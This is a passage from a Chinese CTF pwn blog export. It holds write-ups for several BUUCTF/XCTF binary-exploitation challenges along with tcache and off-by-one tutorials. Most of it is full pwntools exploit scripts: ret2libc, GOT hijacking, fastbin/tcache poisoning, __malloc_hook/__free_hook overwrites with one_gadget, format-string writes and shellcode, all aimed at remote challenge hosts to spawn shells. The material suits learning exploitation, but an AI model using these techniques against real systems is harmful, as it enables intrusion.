print(&quot;one_gadget:&quot; + hex(one_gadget)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) p.interactive() ","link":"https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"},{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **题，简单题，五分钟能出的题给👴整了一个多小时，全是本地的libc咋也加载不上去，干脆直接LibcSearcher 没啥好说的，只开了nx exp： from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret 第一次碰见这样的题，好题！ 没有做出来wtcl 总结，为啥没做出来？ 1，找到溢出点了但是不知道怎么利用 2，碰见一堆汇编码就看不下去了，没有仔细分析 完整解题过程： checksec发现只开了nx 拿到ida main函数： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } 发现是有后门的，但是好像要不触发if才可以，如果if条件满足，就会进入wrong，点进去看看是这样的 wrong函数： void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } 就退出程序了，那么我们点进去if里面的judge函数看看 这段无法显示为伪代码（好像是大小限制的原因，改idc脚本应该可以反编译，但是我不会orz） 仔细阅读汇编码，可以发现里面有很多比较的操作，我们走到程序里，不妨输入一个数字看看，发现是猜数字的游戏，连续猜对就可以获得flag，但是要猜10000次，在myinit函数里面 第一个点是一个指针，里面存了10000，应该就是猜对的次数，但是是指针，指针都是非常危险的～ 然后第二个点就是有一个read，可以溢出，我们点进去buf看看 可以看到那个指针就在buf下面0x10处，但是我们可控的空间是0x16，所以我们可以控制target指针。 那么我们控制到哪里呢？ 我们在pwndbg里面发现printf的plt和system的plt很接近，就差0x10，而且是printf的plt比system的大0x10，所以我们可以把target改写成printf的got地址，然后每当猜对一次target就会减一，当我们猜对15次，第十六次猜错就会调用printf 而这个时候，printf@plt已经被改成了system@plt，然后存在buf里面的字符串会被当成参数传入system，所以我们只需要在输入name的时候把binsh打进去就好了 exp： from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #最后面的是printf的got地址，当然也可以用p32发过去 #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 今天太忙了，刚搬了宿舍，换了新环境，忙里偷闲打了一道去年的国赛题 目前就找到两种思路，第一种思路打fastbin的时候有些问题，因为不太清楚python怎么传空字符串之类的问题，导致结构体里面的指针一直在变，所以这种思路等过两天有空的时候再想想吧。第二种思路就是打__free_hook，__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) 几个点： 当题目对于申请的chunk大小限制无要求，我们可以申请大chunk，free后放入unsorted bin直接泄漏libc 攻击__free_hook比one_gadget更简单 exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',25338) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;第一种思路：利用fastbin attack 攻击__malloc_hook函数，尚未成功&quot;) print(&quot;========== step 1 : leak libc ============&quot;) add(0x410,'a','b') #0 add(0x10,'c','d') #1 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;) print(&quot;libc base : &quot; + hex(libc_base)) print(&quot;=========== step 2 : fastbin attack =========&quot;) add(0x60,'A','B') #3 delete(3) delete(3) add(0x60,p64(__malloc_hook-0x23),'hack') print(&quot;=========== step 3 : one_gadget =========&quot;) one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh') #add(0x10,'a','b') pause() p.interactive() ''' print(&quot;第二种思路：利用unsorted bin逃逸出tcache bin，然后攻击__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() 临时加个攻防世界：string 这个题是有个师傅问我的，其实原来做过了，但是好久没有玩过格式化字符串漏洞了，就重新做一下 收获的几个点： 1，注意mmap函数的第三个参数 2，shellcode = asm(shellcraft.sh())能打通，如果再加上str()就不可以了 exp: from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./dragon') else: p = remote('220.249.52.133',37799) p.recvuntil(&quot;secret[0] is &quot;) address = int(p.recvuntil(&quot;\\n&quot;),16) print(hex(address)) p.sendlineafter(&quot;What should your character's name be:\\n&quot;,'name') p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,'east') p.sendlineafter(&quot;go into there(1), or leave(0)?:\\n&quot;,'1') p.sendlineafter(&quot;'Give me an address'\\n&quot;,str(address)) print(&quot;经过测试，发现格式化字符串是第7个参数&quot;) payload = fmtstr_payload(7,{address:85}) p.sendlineafter(&quot;And, you wish is:\\n&quot;,payload) print(&quot;经过格式化字符串，我们可以发送shellcode了，因为mmap的第三个参数&quot;) context(os = 'linux',arch = 'amd64') shellcode = asm(shellcraft.sh()) #shellcode = asm(shellcraft.amd64.linux.sh()) print(shellcode) #shellcode = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot; p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;) p.sendline(shellcode) p.interactive() wustctf2020_closed 学到了，抽空得学习下IO_FILE的知识 0，1，2 分别对应 stdin stdout stderr close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭了报错信息 可以看到我们其实已经拿到了shell，那么我们直接重定向就好 exec 1&gt;&amp;0 不需要exp 直接nc就好 hitcontraining_magicheap 逆向 main函数，发现框起来的地方有些可疑 点开函数，发现有后门 创建堆块 编辑堆块，存在漏洞，可以自定义堆块编辑的大小（老漏洞了 删除堆块，🈚️UAF 因为没有show函数之类的，所以很难泄漏信息，正好程序没开pie，干脆直接利用后门，想办法在magic附近伪造chunk find_fake_fast永远滴神！！ exp 环境可能出问题了，同样的exp打了十次才通，本地是通了，远程也终于通了 from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./magicheap') else: p = remote('node3.buuoj.cn',25199) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:', content) def free(index): p.sendlineafter('Your choice :', '3') p.sendlineafter('Index :',str(index)) print(&quot;===== 第一种思路： 不管后门，直接fastbin attack 打mallochook ======&quot;) print(&quot;======= 但是没有show函数，我们无法泄漏libc ======&quot;) print(&quot;所以综上考虑，要不我们还是利用后门好了-.-||&quot;) ''' add(0x10,b'A' * 8) #chunk0 add(0x30,b'a' * 8) #chunk1 free(1) fake_chunk = 0x602062 payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk) print(&quot;payload length:&quot; + str(len(payload))) #print(p.recv()) #edit(0,41,payload) ''' print(&quot;double free搞一下&quot;) add(0x30,'A') #chunk0 add(0x60,'B') #chunk1 fake_chunk = 0x60207D free(1) payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk) print(&quot;这里不知道哪里错了，编辑功能总是上不去，可能是函数内部编写的有问题，懒得看了-.-&quot;) p.sendline('2') p.sendline('0') p.sendline(str(len(payload))) p.send(payload) #edit(0,len(payload),payload) add(0x60,p64(fake_chunk)) payload = 0x13 * b'A' + p64(0x1306) add(0x60,payload) p.interactive() bjdctf_2020_router 好题，感觉这种题才有意思，不像别的题，直接栈溢出啥的或者ROP链 直接看main函数 我们可以利用留言功能，虽然无法栈溢出，但是可以污染数组dest，为什么要污染dest？因为在1里面有system(dest)，我们只需要污染dest，变成binsh即可拿到shell exp from pwn import * local = 0 if local == 1: p = process('./bjdctf_2020_router') else: p = remote('node3.buuoj.cn',29147) elf = ELF('./bjdctf_2020_router') libc = ELF('./libc.so.6') def dbg(): context.log_level = 'debug' #dbg() p.recvuntil('Please input u choose:\\n') p.sendline('3') p.recvuntil('Your suggest will help us to do better!') payload = 0x20 * b'A' + b'/bin/sh\\x00' payload = payload.ljust(0x3A,b'a') p.send(payload) p.recvuntil('Please input u choose:\\n') p.sendline('1') p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"[V&N2020 公开赛]easyTHeap","content":"用这个题来总结一下tcache attack 关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337 tcache tcache结构体 Tcache机制是在libc-2.26中引入的一个新的堆管理机制。 首先是引进了两个结构体，tcache_perthread_struct和tcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; 第一个结构体用来管理堆，大小为0x240，可以管理大小小于0x400的堆块，为啥呢？写个简单的小demo大家就明白了 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } 上面简单的例子，就是申请了从0x10-0x70大小的堆块，然后我们全部都free掉，然后gdb调试一下会发现如下结果 可以看到tcache_perthread_struct结构体是以一个堆的形式存在于堆空间中管理者堆块，其大小为 0x250，然后不考虑其prevsize和size位，前0x40的空间管理着所有tcache bin的个数（最大是7），从0x10开始，那么就是 0x40 * 8 * 2 = 1024，hex(1024) = 0x400，所以它最大可存到0x400的堆块。 对比fastbin tcache bin与fastbin极其相似但是又有所不同 同：管理方式为FILO的单链表形式，每一个bins的inuse位总为1，不担心合并 异：fastbin的fd的指针指向chunk ptr，而tcache指向mem ptr。tcache不检查chunk的size是否符合要求，也就是说指哪打哪，不用考虑size位了，比如打__malloc_hook不用分配到-0x23的位置了，想分配到哪就分配到哪。tcache不检查double free。tcache优先级最高。 malloc和free的过程 malloc： malloc(size)，若size小于0x400会优先从tcache bins里面寻找，若没有，则再从别的bins里面找。 Tcachebin未满时，却从Fastbin/Smallbin中取出堆块，则会将链上的其他堆块都链入Tcachebin中。其具体算法是首先将Fastbin/Smallbin中取出的堆块指针进行保存，并判断该大小对应的Tcachebin是否未满，若未满则将其之后的堆块按照Fastbin/Smallbin的分配顺序将堆块链入Tcachebin中，直到对应大小的Tcachebin放满或Fastbin/Smallbin的链为空，最后将之前取出的堆块指针返回给用户使用。由于是按照Fastbin/Smallbin的分配顺序将堆块放入Tcachebin中，因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的。 文字看不懂（我也没看懂 orz）？没关系，上代码。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } 没错，申请了十个相同大小的chunk，然后全部free掉，其中c开头的是放到tcache bins中的，f开头的是tcache满了然后被放到了fastbins里面中去。 看一下内存分布 然后我们改一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } 思路就是我们将tcachebin填满，然后free3次同样大小的chunk，发现进入到fastbin里面，然后我们通过malloc将tcachebin全部清空，如下图 可以看到此时tcachebin已经空了 fastbin里面是这样的 然后再malloc一次，发现fastbin被清空，剩余的两个bin被移到tcachebin里面去 本来是350指向330 移入到tcache后变成了340(0x350 - 0x10)指向了360 证明了前文的结论，“因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的”。 利用方法 贴个大佬总结的，我仔细看了看这几个方法的说明，本题目应该用了以下前三个漏洞，其实叫啥名不重要，会用就行~ Tcache poisoning（tcache 投毒） 在上一部分中也提到过这种方法。与Fastbin Attack类似，篡改Tcachebin中的fd字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与Fastbin相比，Tcachebin中为了得到更高的效率而舍去了安全性，在进行申请时没有对size位进行校验，而且由于Tcachebin中的fd是指向下一个堆块的fd(Fastbin的fd是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。 Tcache dup（？？？） 这是Tcache机制刚推出的几个版本中，在进行free操作时没有对这个堆块进行一个安全检测而导致可以对同一个堆块进行多次free，那么就会变成一个Tcachebin链上链了两个相同的堆块(我指向我自己)，后面也就不用多说了。但值得一提的是在libc-2.29版本中加入了检查机制(源码的4201-4216行)，会在堆块进行free时检查这个堆块是否已经存在于这条链上，如果存在则会报&quot;free():double free detected in tcache 2&quot;的错误，因此这种直接double free利用方式存在于libc-2.26至libc-2.28的版本中。 Tcache perthread corruption （结构体污染） 在最开始介绍结构体时提到的tcache_perthread_struct结构体，该结构体size为0x250，是管理整个Tcachebin的结构体，如果对这个结构体有写权限，那么可以控制任意大小Tcachebin的入口地址。 U2T（翻译君死了） U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。 题目 逆向 稍微逆一下就发现了delete的时候存在UAF漏洞 不过必须要注意的是，我们只能malloc 7次，free 3次 pwn it !!! 这道题保护全开，所以我们可以攻击__malloc_hook 思路： 1，攻击__malloc_hook，必须要伪造chunk，我们可以利用tcache的特点，利用结构体污染，将tcache_perthread_struct的指针域改为__malloc_hook附近 2，污染结构体，必须要能分配到结构体上，我们可选择double free，但是前提必须要知道结构体的地址，我们可以利用show来泄漏地址，malloc(size),free(),free()，这样该chunk就记录了自己的地址，减去0x250就是结构体的地址 3，打one_gadget，必须要知道libc基地址，我们利用free态的结构体堆块（0x250会进入unsorted bin），泄漏main_arena上方的__malloc_hook拿到基地址 一种方法 唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:逃逸tcache ==============&quot;) print(&quot;-------- 利用double free，将fd ptr 写到 tcache处 -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- 改写tcahche结构体中堆块的数量，使以后的chunk可以不进入tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct 但是这里的size仍然是0x251 edit(3,b'a' * 0x30) print('================= step2:泄漏libc ==============') print('----- 利用3号堆块（tcache结构体堆块），释放后进入unsorted bin中，泄漏libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- 获得一些函数和one gadget的地址 ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: 攻击 __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() 另一种方法 （似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ） 好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈 from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: 逃逸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: 泄漏libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #触发one_gadget p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 公开赛]simpleHeap","content":"通过这个题目来学习 off-by-one 什么是off by one(null) ? 定义我也不知道，直接说我的理解。就是那种在用户输入时，一个循环处理边界问题或者是数组越界，对我们的输入没有很好的处理，就会导致一个字节的溢出（或者是strcpy处理不当）。 利用off-by-one 有师傅喜欢叫off-by-one 为一个字节的偷渡攻击 给攻击者发挥的攻击空间也只有一个字节，所以利用方式还是有一定限制的 我们最常利用的（或许是）手法是 堆块重叠（chunk extend），跟我之前讲过的“堆块怀孕”本质是一个东西，chunk extend 的利用条件如下： 1，能够进行堆空间的布局（即写入之类的功能） 2，至少能够溢出一个字节 其中第二个条件正好符合off-by-one的情景 利用过程：off-by-one + chunk extend 由于本人水平有限（wtcl orz 所以就举两个例子好了，一个是开启了Full RELRO，一个没开启 got表无防护的利用情景 既然got表无防护，那么我们可以利用这一个字节的溢出来改写got表，看详细的c代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } 思路是申请三个chunk，大小分别为0x18,0x20,0x30 第一个chunk用来出发off-by-one 漏洞，第二个chunk用来构筑堆块重叠，第三个chunk用来构筑 fake chunk，我们利用第一个chunk溢出一字节来改写第二个chunk的size位，然后将第三个chunk来包含进去，然后free两次，在malloc一次，拿到big chunk的控制权，通过向big chunk里写入内容，改写free small chunk的fd pointer(此时smaller chunk还是free态)，接着malloc两次，我们就能够拿到一个fake chunk，如果fake chunk位于got表附近，那么我们便可以劫持got表项继而拿到shell 接下来我们看具体的调试过程。 malloc拿到三个堆块： 人为构造一个off-by-one来溢出一字节： free两次，可以看到我们改写后的chunk已经变成了free态： 通过向big chunk里写内容可以改写fd pointer，可以看到2号chunk的pointer已经变成了‘AAAA’…… 这个便是劫持got表的流程 got 表不可写： 对于got表项不可写的elf，我们可以借鉴fastbin attack的思路来攻击__malloc_hook函数，将__malloc_hook函数改写成one_gadget，触发malloc拿shell 思路很简单，大体思路和上面一样，然后三号chunk的fd pointer可以写成__malloc_hook+23的位置（字节错位，具体原因不再赘述），然后将__malloc_hook改写即可，注意的是，为了达到fastbin attack的目的，我们3号块的mem大小必须是0x60，因为要把0x7f的fake chunk链接在同一个bin中 题目解析： 逆向过程： 代码量尚可，off-by-one的漏洞还是有一定隐秘性的，具体的逆向分析不再赘述 注意两个点即可： 第一，本程序不存在UAF漏洞，即delete函数中对free的chunk处理的很好，把free态的指针数据都给清空了 第二，就是off-by-one的产生的位置 可以看到，if判断语句是小于号，也就是说当变量等于size+1的时候依然可以可以读入数据，这就是典型的off-by-one漏洞 pwn it ！！！ 思路分析 这个程序保护全开，所以我们不能攻击got表了，我们只能选择__malloc_hook函数，但是我们要想找到__malloc_hook函数，我们必须泄漏libc，但是程序只允许我们申请fastbin大小的chunk 这个题有一个很巧妙的泄漏libc的方法，就是将两个fastbin合并成一个unsortedbin，利用unsorted bin来泄漏main_arena + 88的位置，然后拿到libc基址。 具体思路是这样的，构造四个chunk： chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 （防止与top chunk合并） 我们通过off-by-one将1和2合并，free 1，这个时候1和2合并的chunk已经超过fastbin，进入unsorted bin，我们再malloc(0x50)，这个时候unsorted bin就会切割下来0x50，剩下2号chunk留在unsorted bin里面，但是！！我们从始至终都没有free chunk 2，2号指针的控制权仍然在我们手中，所以我们可以打印2号chunk的内容，为什么呢？因为2号chunk在unsorted bin里，其fd 和 bk都是有内容的！！他们都指向了main_arena + 88，通过这一点，我们就能泄漏出libc的基地址 我们拿到基址后，就得想办法fastbin attack，有一种办法就是我们上文说的方法，构造三个fastbin chunk，自然是可以的，但是如果题目限制我们malloc次数，我们还有办法吗？（这个题目虽然限制次数，但是依然申请三次依然在允许的范围之内） 答案是有的，我们可以malloc(0x60)，记成chunk 4，然后我们紧接着free 4，这么做的目的就是将这块chunk从unsorted bin中移动到 fastbin中，so 我们再次利用 allocated 态的2号pointer来edit，把fd位改成__malloc_hook - 0x23，然后one_gadget 但是这个题目在gadget的时候我们发现是有问题的，因为四个gadget的寄存器的条件我们均不满足，所以我们得借助__libc_realloc函数来调整寄存器的值，在__libc_realloc函数中会调用__realloc_hook函数，所以我们把one_gadget的位置打到__realloc_hook的位置，把__libc_realloc的地址打到__malloc_hook里面即可，令人兴奋的是，__realloc_hook的位置就在__malloc_hook的上方，这样我们的程序执行流程为，我们malloc---&gt;触发__malloc_hook---&gt;跳转到__libc_realloc调整寄存器---&gt;触发__realloc_hook---&gt;__realloc_hook是我们的one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 漏洞利用 exp:（pwntools版本是python3的版本） from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 